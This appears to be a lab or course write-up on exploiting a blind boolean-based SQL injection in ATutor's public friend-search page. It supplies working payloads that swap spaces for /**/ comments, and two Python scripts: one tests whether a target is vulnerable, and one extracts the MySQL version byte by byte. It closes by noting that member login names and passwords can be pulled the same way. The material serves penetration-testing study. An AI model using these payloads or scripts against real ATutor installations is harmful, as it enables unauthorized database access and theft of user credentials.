## A Small Hurdle
Extracting the data from the database with our blind SQLi, isn't as straight forward.
Our payloads cannot contain any spaces, since they are used as delimiters in the query construction process.

However, since this is an ATutor-related constraint and not something inherent to MySQL, we can replace spaces with anything that constitutes a valid space substitute in MySQL syntax.
For instance, instead of a normal query we can use the following query:

```sql
select/**/1;
```


## Baseline Exploit
Now that we are fully aware of the restrictions in place, our first goal is to create a very simple dummy TRUE/FALSE injection subquery.
The best way to exploit a blind boolean based sqli, is to compare HTML responses.
We can craft simple or even complex boolean based queries to the webserver, and then compare html responses to exfiltrate required data.

2 dummy injections are as follows:
```mysql
#TRUE STATEMENT:
AAAA')/**/or/**/(select/**/1)=1%23;

#FALSE STATMENT:
AAAA')/**/or/**/(select/**/1)=0%23
```

We can also use the atutor mysql database to confirm that these queries will work:

We see that the query returns a 1 as a boolean true result, if we change the 1 to a 0, we get a 0 as a false.

We can use our dummy injections and use a python script to check if the target is vulnerable or not:

```python
import requests
import sys

def searchFriends_sqli(ip, inj_str, query_type):
    target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
    r = requests.get(target)
    content_length = int(r.headers['Content-Length'])
    if (query_type==True) and (content_length > 20):
        return True
    elif (query_type==False) and (content_length == 20):
        return True
    else:
        return False

def main():
    if len(sys.argv) != 2:
        print "(+) usage: %s <target>"  % sys.argv[0]
        print '(+) eg: %s 192.168.121.103'  % sys.argv[0]
        sys.exit(-1)

    ip = sys.argv[1]

    false_injection_string = "test')/**/or/**/(select/**/1)=0%23"
    true_injection_string  = "test')/**/or/**/(select/**/1)=1%23"

    if searchFriends_sqli(ip, true_injection_string, True):
        if searchFriends_sqli(ip, false_injection_string, False):
            print "(+) the target is vulnerable!"

if __name__ == "__main__":
    main()
```

The following sends 2 sqli payloads, if the content length(html response) is more than 20, the result of the boolean query is true.
However, if it's less than 20, it's a false.

Running the script, we find that the web app is vulnerable:

## Building The Query
With the baseline exploit ready, we can now build on our script and payload, in order to exfiltrate valuable data.
Given the fact that we are dealing with a blind SQL injection, we have to resort to a byte-by-byte approach.
A query we can use will compare each byte of the subquery result (MySQL version) with a set of characters of our choice.
For instance, we can ask if the first character of the version string is a "4" or "5":
```sql
select/**/(substring((select/**/version()),1,1))='4';
select/**/(substring((select/**/version()),1,1))='5';
```

If the first character of the version string matches with the character we provide, we'll get a true statement, and vice-versa:

![](../../03.%20Images/t1-ss26.png)

For this payload, we rely on the [substring function](https://www.w3resource.com/mysql/string-functions/mysql-substring-function.php).
It is good practice to convert the resultant character to its numeric ASCII value and then perform the comparison.

Our new exploit script would look like as follows:
```python
import requests
import sys

def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None    

def main():
    if len(sys.argv) != 2:
        print "(+) usage: %s <target>"  % sys.argv[0]
        print '(+) eg: %s 192.168.121.103'  % sys.argv[0]
        sys.exit(-1)

    ip = sys.argv[1]

    print "(+) Retrieving database version...."

    # 19 is length of the version() string. This can
    # be dynamically stolen from the database as well!
    for i in range(1, 20):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print "\n(+) done!"

if __name__ == "__main__":
    main()
```

Running the script against our target, we get an error but are still able to extract the database version:

![](../../03.%20Images/t1-ss27.png)

We can similarly extract login names and passwords which are stored in AT_members in the database.
